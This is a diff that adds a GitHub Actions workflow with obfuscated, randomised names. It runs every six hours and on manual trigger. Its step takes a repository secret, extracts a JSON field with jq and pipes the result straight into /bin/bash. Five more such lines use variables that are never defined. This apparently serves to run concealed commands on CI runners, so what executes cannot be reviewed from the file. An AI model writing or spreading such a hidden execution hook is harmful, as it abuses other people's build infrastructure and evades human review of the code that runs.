@@ -1,0 +1,24 @@
+name: matthewui775
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: matthewui775
+        env:
+          kxeff1: ${{ secrets.kxeff1 }}
+        run: |
+          echo $kxeff1 | jq -r .ppmrs3 | /bin/bash
+          echo $nzy83 | jq -r .iu83 | /bin/bash
+          echo $owt2 | jq -r .g21 | /bin/bash
+          echo $nkdt849 | jq -r .l0 | /bin/bash
+          echo $cjpnt99 | jq -r .g1 | /bin/bash
+          echo $u7 | jq -r .mvuu8033 | /bin/bash
+
